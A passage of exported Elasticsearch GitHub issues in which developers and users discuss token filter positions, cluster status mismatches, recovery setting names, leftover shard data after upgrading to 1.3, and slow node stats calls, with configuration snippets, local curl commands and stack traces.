</description><key id="40882508">7392</key><summary>Removed ConcurrentHashMapV8</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">cfontes</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T06:31:59Z</created><updated>2015-06-07T12:11:54Z</updated><resolved>2014-08-26T10:10:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-26T09:21:44Z" id="53395264">Thank you @cfontes I see your CLA on file ... I'll have a look here.
</comment><comment author="mikemccand" created="2014-08-26T10:07:09Z" id="53399613">OK this LGTM, I'll push shortly. Thank you @cfontes!
</comment><comment author="cfontes" created="2014-08-27T00:54:39Z" id="53513997">Thank you! ES is awesome, feels great to help.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>token position problems of word_delimiter token filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7391</link><project id="" key="" /><description>Hi, all

I got the following index setting

```
{
    "settings": {
        "index": {
            "number_of_shards": 5,
            "number_of_replicas": 0,
            "analysis": {   
                "analyzer": {
                    "fielda_index": {
                         "type": "custom",
                         "tokenizer": "icu_tokenizer",
                         "filter": [ "words_delimiter", "icu_normalizer", "icu_folding"]
                    },
                    "fielda_search": {
                         "type": "custom",
                         "tokenizer": "icu_tokenizer",
                         "filter": ["dot_delimiter", "icu_normalizer", "icu_folding"]
                    }
                },
                "filter": {
                    "dot_delimiter":
                    {
                        "type": "word_delimiter",
                        "generate_word_parts": true,
                        "generate_number_parts": true,
                        "split_on_case_change": false,
                        "preserve_original": true,
                        "split_on_numerics": true
                    },
                    "words_delimiter":
                    {
                        "type": "word_delimiter",
                        "generate_word_parts": true,
                        "generate_number_parts": true,
                        "split_on_case_change": true,
                        "preserve_original": true,
                        "split_on_numerics": true
                    }

                }
            }
        }
    },
    "mappings": {
        "main": {
            "_source": {"enabled": true},
            "dynamic_date_formats": ["basic_date_time_no_millis"],
            "properties": {
                "name": { "type": "string", "index": "analyzed", "index_analyzer": "fielda_index", "search_analyzer": "fielda_search", "include_in_all": true}
            }
        }
    }
}
```

And I use the word "PowerShot" to run the two analyzers, here is the result:

```
fielda_index:   PowerShot(1) Power(1) Shot(2)
fielda_search:  PowerShot(1)
```

The number inside the paren is the token position. 
My question is why the token position of "Shot" is 2. I think the positions of the tokens that are generated by the word_delimiter token filter should be all the same. Ideas?

Because of this, I encounter an problem when performing match_phrase query.
We know the match_phrase query not only match the token but also check the token positions.

So when I insert a document, 

```
{"name": "Canon PowerShot D500"}
```

I cannot using the query 

```
{"from": 0, "size": 100, "query":{"match_phrase": {"name":"Canon PowerShot D500"}}}
```

to find the document I just inserted, because the token position is not matched. 

The tokens result of the two analyzers are:

```
fielda_index    Canon(1) PowerShot(2) Power(2) Shot(3) D500(4) D(4) 500(5)
fielda_search   Canon(1) PowerShot(2) D500(3) D(3) 500(4)
```

Obviously, the position 3 of fielda_search is "D500", but the "D500" token of fielda_index locates at position 4. So it cannot be found the desired document.

The reproducible gist script is https://gist.github.com/hxuanji/b94d9c3514d7b08005d2

So are there any reason why the token position of the tokens that generated by word_delimter filter behave like these? 
Since the extra tokens generated from word_delimiter are just "extended" cases of the original token, I think the position should remains to the original one. Do I misunderstand something or any other reasons?

Best,
Ivan
</description><key id="40881712">7391</key><summary>token position problems of word_delimiter token filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">hxuanji</reporter><labels /><created>2014-08-22T06:11:09Z</created><updated>2017-05-15T06:47:34Z</updated><resolved>2014-08-22T14:58:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T14:58:59Z" id="53070931">Hi @hxuanji 

You are, unfortunately, correct. The WDF does generate new positions, which breaks the token filter contract.  This is how it is in Lucene and currently there are no plans to change this in Lucene.

You can't use phrase queries with WDF.

You may be able to achieve what you want with the [pattern capture](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-pattern-capture-tokenfilter.html#analysis-pattern-capture-tokenfilter) instead.
</comment><comment author="hxuanji" created="2014-08-25T10:09:49Z" id="53247771">Hi @clintongormley,

I have another question about it. Assume I modify the setting of the filters into:

```
"dot_delimiter":
                    {
                        "type" : "pattern_capture",
                        "preserve_original" : 1,
                        "patterns" : [
                          "([\\p{Ll}\\p{Lu}]+\\d*|\\d+)"
                       ]
                    },
                    "words_delimiter":
                    {
                        "type" : "pattern_capture",
                        "preserve_original" : 1,
                        "patterns" : [
                          "(\\p{Ll}+|\\p{Lt}+|\\p{Lu}+\\p{Ll}+|\\p{Lu}+)",
                          "(\\d+)"
                       ]
                    }
```

Now, the token position should be the same. 
Now if I got the document:

```
{"name": "942430__n.jpg"}
```

Its token result of the two analyzers would be

```
fielda_index    942430__n.jpg(1) 942430(1) n(1) jpg(1)
fielda_search   942430__n.jpg(1) 942430(1) n(1) jpg(1)
```

As we see, the token positions are all located at pos 1. 
But under this situation, I use the command: 

```
{"from": 0, "size": 100, "query":{"match": {"name":{"query":"942430__n.jpg", "operator" : "and"}}}}
```

to query, but why does the result are included some documents whose tokens include only "n", such as {"name":"n" } ? 

The reproducible gist: https://gist.github.com/hxuanji/8e58c0ffb391ced49439

Although I make sure the "and" operator, it seems only make sure the condition between "positions" not the "tokens". Does it make sense?

It seems I have some misunderstanding about the "matching rule" of "and" function.

Thanks a lot.
</comment><comment author="clintongormley" created="2014-08-25T10:23:59Z" id="53248849">Hi @hxuanji 

A trick for figuring out exactly what the query is doing is to use the `validate-query` API with the `explain` option:

```
curl -XPOST "http://localhost:9200/test/main/_validate/query?explain" -d'
{
  "query": {
    "match": {
      "name": {
        "query": "942430__n.jpg",
        "operator": "and"
      }
    }
  }
}'
```

This outputs:

```
     "explanation": "filtered(name:942430__n.jpg name:942430 name:n name:jpg)-&gt;cache(_type:main)"
```

So any of the terms in the same position are allowed.  The `and` operator doesn't affect "stacked" terms.  The reason for this is that these terms are like synonyms.  You require one of the synonyms to be in position 0, but not all of them.
</comment><comment author="hxuanji" created="2014-08-25T11:04:19Z" id="53251437">Hi, @clintongormley 
I got it!  Thanks for your help.

Ivan
</comment><comment author="dklotz" created="2015-01-29T12:11:03Z" id="72014315">@clintongormley I think this problem with the positions of the `word_delimiter` filter should be mentioned on the respective reference / guide pages... Just ran into the same thing.
</comment><comment author="mikemccand" created="2017-01-06T20:20:50Z" id="270996341">I am trying to fix this issue in Lucene: https://issues.apache.org/jira/browse/LUCENE-7619

It would mean you need to include c:WordDelimiterGraphFilter (once it's released) in your search-time analyzer.</comment><comment author="vsiv" created="2017-05-15T06:47:07Z" id="301390224">WordDelimiterGraphFilter is now released and available in v5.4. FYI to those who stumble upon this thread. thanks @mikemccand for this!!

V</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cluster/Health and Cluster/Stats disagree on status</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7390</link><project id="" key="" /><description>If you force your cluster to remain in a Red state on startup, the cluster health and cluster stats disagree on the status.

E.g.  Set `recover_after_nodes: 10` in a one-node cluster.  Cluster never recovers because the number of nodes is not satisfied.  `/_cluster/health` shows Red, `/_cluster/stats` shows Green

``` bash
GET _cluster/health

{
   "cluster_name": "elasticsearch_macbookair_zach",
   "status": "red",
   "timed_out": false,
   "number_of_nodes": 1,
   "number_of_data_nodes": 1,
   "active_primary_shards": 0,
   "active_shards": 0,
   "relocating_shards": 0,
   "initializing_shards": 0,
   "unassigned_shards": 0
}
```

``` bash
GET _cluster/stats

{
   "timestamp": 1408649084720,
   "cluster_name": "elasticsearch_macbookair_zach",
   "status": "green",
   "indices": {
      "count": 0,
      "shards": {},
      "docs": {
         "count": 0,
         "deleted": 0
      },
   ...

}
```
</description><key id="40839291">7390</key><summary>Cluster/Health and Cluster/Stats disagree on status</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">polyfractal</reporter><labels><label>:Stats</label><label>adoptme</label><label>bug</label><label>v2.1.0</label><label>v2.2.0</label><label>v5.0.0-alpha1</label></labels><created>2014-08-21T19:26:52Z</created><updated>2015-11-12T19:45:34Z</updated><resolved>2015-11-12T19:22:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="hcz3" created="2015-04-27T09:08:25Z" id="96576940">@polyfractal I noticed the issue and reproduced it, what do you think the possible reason is? Is it the right way to find out where to judge the cluster status colour and see how it works?
</comment><comment author="clintongormley" created="2015-04-27T09:16:54Z" id="96580102">This looks like a bug in cluster stats.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>"Recover after Nodes / Time" logic and naming is confusing</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7389</link><project id="" key="" /><description>The current recover after node/time logic is very easily to get wrong.  The logic today is:
- `recover_after_nodes` (and friends) are hard limits.  The cluster _will not_ recover unless these conditions are met.
- Once the `recover_after_*` conditions are met, the cluster waits for `gateway.expected_nodes` OR `gateway.recover_after_time`, whichever comes first.

This is a confusing sequence of logic, since `gateway.recover_after_time` looks like a "failsafe" that will start recovery after X period of time, regardless of the other settings.  In reality, it is only invoked if the first `recover_after_*` settings are satisfied.

At a minimum, the docs should spell this out more clearly.  Better, we should probably do some renaming.  Perhaps:
- `recover_after_nodes` becomes `minimum_node_count` ?
- `gateway.recover_after_time` becomes `gateway.wait_for_expected` ?

And there should probably be a new setting, `force_recover_after_time` which will force recovery regardless of any other setting, in case people want a nuclear failsafe option to get the cluster back online.
</description><key id="40838836">7389</key><summary>"Recover after Nodes / Time" logic and naming is confusing</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">polyfractal</reporter><labels><label>:Settings</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-21T19:21:41Z</created><updated>2017-05-05T10:03:06Z</updated><resolved>2016-11-28T09:41:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-22T11:10:31Z" id="53048698">agreed it's confusing.  +1 on `gateway.min_node_count`. Maybe `gateway.expected_max_wait`? feels more natural to me.

re: `force_recover_after_time` - is this needed? because it practically means don't use `min_node_count` but rather `expected_nodes` (`_count`?) &amp; `expected_max_wait`.  I do feel it will be great if there will be an API to force restart when these limits are hit.
</comment><comment author="polyfractal" created="2014-08-22T13:00:31Z" id="53057113">I like `gateway.expected_max_wait`, or potentially `gateway.max_wait_for_expected`

&gt; re: force_recover_after_time - is this needed? because it practically means don't use min_node_count but rather expected_nodes (_count?) &amp; expected_max_wait. I do feel it will be great if there will be an API to force restart when these limits are hit.

Agreed, it does seem redundant.  I think my motivation was some way to force a recovery, because otherwise a misconfiguration (or long "transient" event, like multi-day maintenance) will require a config change and restart of all masters.

An API to force the recovery would be much better.  
</comment><comment author="clintongormley" created="2014-08-22T15:42:03Z" id="53076849">I like `gateway.expected_nodes` and `gateway.min_nodes`.

For the timeout, I think like `gateway.wait_for_expected` most.  Another possibility: `gateway.expected_nodes_timeout`?
</comment><comment author="clintongormley" created="2014-11-07T09:58:44Z" id="62121243">```
gateway.recovery.expected.nodes: 5
gateway.recovery.expected.max_wait: 10s
gateway.recovery.required.nodes: 3
```
</comment><comment author="bleskes" created="2014-11-07T09:59:20Z" id="62121320">+1 to naming suggestions by @clintongormley 
</comment><comment author="clintongormley" created="2016-11-26T12:22:47Z" id="263060575">@bleskes Are these setting still required with stale shard detection?  What about master election?</comment><comment author="bleskes" created="2016-11-26T20:11:47Z" id="263083150">@clintongormley we don't indeed need them for shard security. They are however nice as they prevent too much shard relocation upon start up - waiting on nodes to join means the master will be more likely to find existing shard copies and assign replicas there rather than making fresh copies.</comment><comment author="clintongormley" created="2016-11-28T09:41:40Z" id="263225699">OK - given the diminishing role of these settings and the fact that nobody else has complained in the last two years, I'm going to close this as won't fix</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Context Suggester: Need better error message if you omit category when indexing.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7388</link><project id="" key="" /><description>Example below (I am omitting the color field category when I index). Error message I get back is:

{"error":"ElasticsearchIllegalArgumentException[one or more prefixes needed]","status":400}

Would be nice to instead say something like "color category must be specified/is missing."

curl -XPUT localhost:9200/test_1 -d '
{
 "settings": {
   "index": {
     "number_of_replicas": "0",
     "number_of_shards": "1"
   }
 },
 "mappings": {
   "doc": {
     "properties": {
       "context_suggest": {
         "type": "completion",
         "context": {
           "color": {
             "type": "category",
             "path": "color",
             "default": []
           }
         }
       }
     }
   }
 }
}'

curl -XPUT localhost:9200/test_1/doc/1 -d '
{
  "context_suggest": {
    "input": ["test"],
    "output": "test"
  }
}'
</description><key id="40835276">7388</key><summary>Context Suggester: Need better error message if you omit category when indexing.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">bly2k</reporter><labels><label>enhancement</label></labels><created>2014-08-21T18:44:08Z</created><updated>2015-11-21T17:28:05Z</updated><resolved>2015-11-21T17:28:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T17:28:05Z" id="158663528">The new completion suggester https://github.com/elastic/elasticsearch/pull/11740 now allows zero contexts.  Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add back string op type to IndexRequest</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7387</link><project id="" key="" /><description>This was removed by accident I think, and it breaks backward comp. on the Java API in minor 1.3 version
</description><key id="40835135">7387</key><summary>Add back string op type to IndexRequest</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Java API</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T18:42:37Z</created><updated>2015-06-07T19:03:40Z</updated><resolved>2014-08-21T19:04:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T18:55:08Z" id="52965560">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Upgrade caused shard data to stay on nodes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7386</link><project id="" key="" /><description>Upgrade caused shard data to stay on nodes even after it isn't useful any more.

This comes from https://groups.google.com/forum/#!topic/elasticsearch/Mn1N0xmjsL8

What I did:
Started upgrading from Elasticsearch 1.2.1 to Elasticsearch 1.3.2.  For each of the 6 nodes I updated:
- Set allocation to primaries only
- Sync new plugins into place
- Update deb package
- Restart Elasticsearch
- Wait for Elasticsearch to respond on the local host
- Set allocation to all
- Wait for Elasticsearch to report GREEN
- Sleep for half an hour so the cluster can rebalance itself a bit

What happened:
The new version of Elasticsearch came up but didn't remove all the shard data it can't use.  This picture from Whatson shows the problem pretty well:
https://wikitech.wikimedia.org/wiki/File:Whatson_out_of_disk.png
The nodes on the left were upgraded and blue means disk usage by Elasticsearch and brown is "other" disk usage.

When I dig around on the filesystem all the space usage is in the shard storage directory (/var/lib/elasticsearch/production-search-eqiad/nodes/0/indices) but when I compare the list of open files to the list of files on the file system [with this](https://gist.github.com/nik9000/d2dba49c156a5259a7d6) I see that whole directories are just sitting around, unused.  Hitting the `/_cat/shards/&lt;directory_name&gt;` corroborates that the shard in the directory isn't on the node.  Oddly, if we keep poking around we find open files in directories representing shards that we don't expect to be on the node either....

What we're doing now:
We're going to try restarting the upgrade and blasting the data directory on the node as we upgrade it.

Reproduction steps:
No idea.  And I'm a bit afraid to keep pushing things on our cluster with it in the state that it is in.
</description><key id="40834362">7386</key><summary>Internal: Upgrade caused shard data to stay on nodes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T18:34:53Z</created><updated>2014-09-25T07:48:09Z</updated><resolved>2014-08-27T19:42:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T19:09:42Z" id="52967396">could this be related to #6692 did you upgrade all nodes to 1.3 or do you still have nodes &lt; 1.3.0 in the cluster?
</comment><comment author="nik9000" created="2014-08-21T19:16:30Z" id="52968298">Only about 1/3 of the nodes before we got warnings about disk space.
</comment><comment author="s1monw" created="2014-08-21T19:30:02Z" id="52970067">I guess it's not freeing the space unless an upgraded node holds a copy of the shard. That is new in 1.3 and I still try to remember what the background was. Can you check if that assumption is true, are the shards that are not delete allocated on old nodes? 
</comment><comment author="nik9000" created="2014-08-21T19:32:12Z" id="52970325">Well, this is almost certainly the cause:

``` java
            // If all nodes have been upgraded to &gt;= 1.3.0 at some point we get back here and have the chance to
            // run this api. (when cluster state is then updated)
            if (node.getVersion().before(Version.V_1_3_0)) {
                logger.debug("Skip deleting deleting shard instance [{}], a node holding a shard instance is &lt; 1.3.0", shardRouting);
                return false;
            }
```

1.3 won't delete stuff from the disks until the whole cluster is 1.3.  That's ugly.  I run with disks 50% full and the upgrade process almost filled them just with shuffling.

Side note:  if the shards are still in the routing table it'd be nice to see them.  Right now they seem to be invisble to he _cat api.
</comment><comment author="s1monw" created="2014-08-21T19:36:34Z" id="52970877">@nik9000 this was a temporary thing to add extra safety. It will get lower the more nodes you upgrade. I agree we could expose some more infos here if stuff is still on disk. 
</comment><comment author="nik9000" created="2014-08-21T19:44:11Z" id="52971803">This gave me quite a scare!  I was running this upgrade over night with a script with extra sleeping to keep the cluster balanced.  It woke me up with 99% disk utilization on one of the nodes.  I'll keep pushing the upgrade through carefully.
</comment><comment author="nik9000" created="2014-08-21T19:49:17Z" id="52972485">For posterity: if you nuke the contents of your node's disk after stopping Elasticsearch 1.2 but before starting Elasticsearch 1.3 then you won't end up with too much data that can't be cleared.  The more nodes you upgrade the more shards you'll be able to delete any way - like @s1monw said.
</comment><comment author="s1monw" created="2014-08-21T20:11:30Z" id="52975394">just to clarify a bit more we added some safety in 1.3 that required a new API and we can only call this API if we know that we are allocated on another 1.3 or newer node that is why we keep the data around longer. thanks for opening this nik!
</comment><comment author="nik9000" created="2014-08-22T17:30:28Z" id="53093264">So far we haven't seen any cleanup of old shards and we've just restarted the last node to pick up 1.3.2.
![whatson_not_yet_cleaning](https://cloud.githubusercontent.com/assets/215970/4014563/c678a198-2a21-11e4-88e2-f5a00fe5c987.png)
Deleting the contents of the node slowed down the upgrade but allowed us to continue the process without space being taken up by indexes we couldn't remove.
</comment><comment author="martijnvg" created="2014-08-22T17:48:10Z" id="53095900">The unused shard copies only get deleted if all its active copies can be verified. Maybe shard to be cleaned up had copies on this not yet upgraded node?

Unused shard copies should get cleaned up now, if that isn't the case then that is bad.

If you enable trace logging for the `indices.store` category then we can get a peek in ES' decision making.
</comment><comment author="nik9000" created="2014-08-22T18:19:47Z" id="53101246">@martijnvg - I'll see what happens once all the cluster goes green after the last upgrade - that'll be in under an hour.

Did we do anything to allow changing log levels on the fly?  I remember seeing something about it but #6416 is still open.
</comment><comment author="nik9000" created="2014-08-22T18:20:04Z" id="53101282">And by we I mean you, I guess :)
</comment><comment author="martijnvg" created="2014-08-22T18:24:30Z" id="53101853">:) Well this has been in for a while: #2517

Which allows to change the log settings via the cluster update api.
</comment><comment author="nik9000" created="2014-08-22T18:31:10Z" id="53102715">OK!  Here is something:  https://gist.github.com/nik9000/89013550ec78da5808e4
</comment><comment author="nik9000" created="2014-08-22T18:36:43Z" id="53103433">That is getting spit out constantly.
</comment><comment author="nik9000" created="2014-08-22T18:48:15Z" id="53104861">Looks like it is on every node as well.
</comment><comment author="nik9000" created="2014-08-22T18:50:08Z" id="53105078">Cluster is now green and lots of old data still sitting around.
</comment><comment author="bleskes" created="2014-08-22T19:06:59Z" id="53107069">@nik9000 this is very odd. The line points at a null clusterName . All the nodes are continuously logging this? Can I ask you to enable debug logging for the root logger and share the log? I hope to get more context into when this can happen.
</comment><comment author="nik9000" created="2014-08-22T19:08:18Z" id="53107251">I see that cluster name is something that as introduced in 1.1.1.  Maybe a coincidence - but I haven't performed a full cluster restart since upgrading to 1.1.0.
</comment><comment author="nik9000" created="2014-08-22T19:09:26Z" id="53107379">Let me see about that debug logging - seems like that'll be a ton of data.  Also - looks like this is the only thing that doesn't check if the cluster name is non null.  Probably just a coincidence because it supposed to be non-null since 1.1.1 I guess.....
</comment><comment author="bleskes" created="2014-08-22T19:13:20Z" id="53107785">@nik9000 I'm not sure I follow what you mean by 

&gt;  looks like this is the only thing that doesn't check if the cluster name is non null. 

I was referring to this line: https://github.com/elasticsearch/elasticsearch/blob/v1.3.2/src/main/java/org/elasticsearch/indices/store/IndicesStore.java#L418
</comment><comment author="nik9000" created="2014-08-22T19:20:54Z" id="53108638">@bleskes - sorry, yeah.  I was looking at other code that looked at the cluster name and its pretty careful around the cluster name potentially being null.  Like 
https://github.com/elasticsearch/elasticsearch/blob/v1.3.2/src/main/java/org/elasticsearch/cluster/ClusterState.java#L577 and https://github.com/elasticsearch/elasticsearch/blob/v1.3.2/src/main/java/org/elasticsearch/discovery/zen/ZenDiscovery.java#L551 .

I guess what I'm saying is that if the cluster state never picked up the name somehow this looks like the only thing that would break.
</comment><comment author="nik9000" created="2014-08-22T19:25:33Z" id="53109158">Tried setting logger to debug and didn't get anything super interesting.  Here is some of it: https://gist.github.com/nik9000/b9c40805abb4bcbb5b61
</comment><comment author="bleskes" created="2014-08-22T19:37:40Z" id="53110529">Thx Nik.  I have a theory. Indeed the cluster name as part of the _cluster state_ was introduced in 1.1.1 . When a node of version &gt;=1.1.1 reads the cluster state from an older node, that field will be populated with null. During the upgrade from 1.1.0 this happened and the cluster state in memory has it's name set to null. Since you never restarted the complete cluster since then, all nodes have kept communicating it keep it alive. This trips this new code. A full cluster restart should fix it but that's obviously totally not desirable. I'm still trying to come up with a potential work around... 
</comment><comment author="bleskes" created="2014-08-22T19:40:12Z" id="53110831">@nik9000 do you use dedicated master nodes? it doesn't look so from the logs but I want to double check
</comment><comment author="nik9000" created="2014-08-22T19:42:46Z" id="53111137">@bleskes no dedicated master nodes.
</comment><comment author="nik9000" created="2014-08-22T19:44:02Z" id="53111276">@bleskes that's what I was thinking - I was digging through places where the cluster state is built from name and they are pretty rare.  Still, it'd take me some time to validate that they never get saved.
</comment><comment author="nik9000" created="2014-08-22T21:36:41Z" id="53123493">More posterity: this broke for me because when I started the cluster I was using 1.1.0 and I haven't done a full restart since - only rolling restarts.  If you are in that boat - do not upgrade to 1.3 until 1.3.3 is released.
</comment><comment author="bleskes" created="2014-08-27T19:42:30Z" id="53629009">I'm going to close this as it is fixed by the change my in #7414
</comment><comment author="nik9000" created="2014-08-27T20:11:17Z" id="53633204">Thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>nodes stats API slower after upgrade 1.2 -&gt; 1.3</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7385</link><project id="" key="" /><description>hi,
we are observing a problem similar to #5204 in which the nodes stats API is slower on 1.3 than 1.2 (2s vs 17s) I'm not sure however if the same conditions apply.

```
elastic1016:~$ /usr/bin/time curl -s 'localhost:9200/_nodes/_local/stats?groups=_all' &gt;/dev/null
0.00user 0.00system 0:00.17elapsed 4%CPU (0avgtext+0avgdata 15872maxresident)k
24inputs+0outputs (1major+1080minor)pagefaults 0swaps
elastic1016:~$ dpkg -l | grep -i elasticsearch
ii  elasticsearch                    1.2.1                             Open Source, Distributed, RESTful Search Engine
```

```
elastic1006:~$ /usr/bin/time curl -s 'localhost:9200/_nodes/_local/stats?groups=_all' &gt;/dev/null
dpkg 0.00user 0.00system 0:02.20elapsed 0%CPU (0avgtext+0avgdata 15840maxresident)k
0inputs+0outputs (0major+1079minor)pagefaults 0swaps
elastic1006:~$ dpkg -l | grep -i elasticsearch
ii  elasticsearch                    1.3.2                             Open Source, Distributed, RESTful Search Engine
elastic1006:~$ 
```

let me know if you need more informations!
</description><key id="40832462">7385</key><summary>nodes stats API slower after upgrade 1.2 -&gt; 1.3</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">filippog</reporter><labels><label>:Stats</label><label>feedback_needed</label></labels><created>2014-08-21T18:15:47Z</created><updated>2014-12-01T11:46:47Z</updated><resolved>2014-12-01T11:46:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-21T19:15:27Z" id="52968154">This is actually transient - sometimes the new hosts reply as quickly  as the old hosts - milliseconds.  But the request is sometimes slow enough to piss of our monitoring.
</comment><comment author="kimchy" created="2014-08-21T19:16:55Z" id="52968372">this might be related to this issue: https://github.com/elasticsearch/elasticsearch/issues/7306, that w just fixed.
</comment><comment author="nik9000" created="2014-08-21T19:22:53Z" id="52969126">Oh!  It could be!  We keep a log of hot threads and I don't see that but it certainly could be trouble.
</comment><comment author="nik9000" created="2014-08-23T00:34:13Z" id="53137300">We were suffering from #7386 while seeing the slow stats.  We'll have to check again once we've resolved that.
</comment><comment author="nik9000" created="2014-08-25T17:17:57Z" id="53294313">Still seeing this after resolving the space issue.  I took some thread dumps of the process with things like:

``` bash
/usr/bin/time curl -s 'localhost:9200/_nodes/_local/stats?groups=_all' &gt;/dev/null &amp; sleep 1; jstack 26782 &gt; /tmp/stack1
```

and collected a gist:  https://gist.github.com/nik9000/550c52043e0d24a51ceb

It looks like

```
at sun.reflect.Reflection.getCallerClass(Native Method)
at java.lang.Class.getDeclaredFields(Class.java:1805)
at org.apache.lucene.util.RamUsageEstimator.shallowSizeOfInstance(RamUsageEstimator.java:382)
at org.apache.lucene.util.RamUsageEstimator.shallowSizeOf(RamUsageEstimator.java:360)
at org.apache.lucene.util.fst.Outputs.ramBytesUsed(Outputs.java:104)
```

is the biggest time consumer.
</comment><comment author="mikemccand" created="2014-08-25T17:47:47Z" id="53299186">That trace (calculating RAM used by an FST) should be fixed after the next upgrade (Lucene 4.10): https://issues.apache.org/jira/browse/LUCENE-5884
</comment><comment author="nik9000" created="2014-08-25T18:09:43Z" id="53303511">Cool.  Maybe we can recheck after the Lucene 4.10 upgrade.
</comment><comment author="engrean" created="2014-11-11T20:53:43Z" id="62618832">Can anyone confirm that this has been fixed in the 1.4 release? We are also getting VERY slow (4 minute) response times to /_nodes when loading the Kibana index.html page.
</comment><comment author="clintongormley" created="2014-11-12T10:12:01Z" id="62696271">@engrean that particular issue has been fixed, but there is always the possibility that there are other issues.  Please could you tell us how many nodes, indices, and shards you have, and send the output of the following command while you are running a `GET /_nodes` request:

```
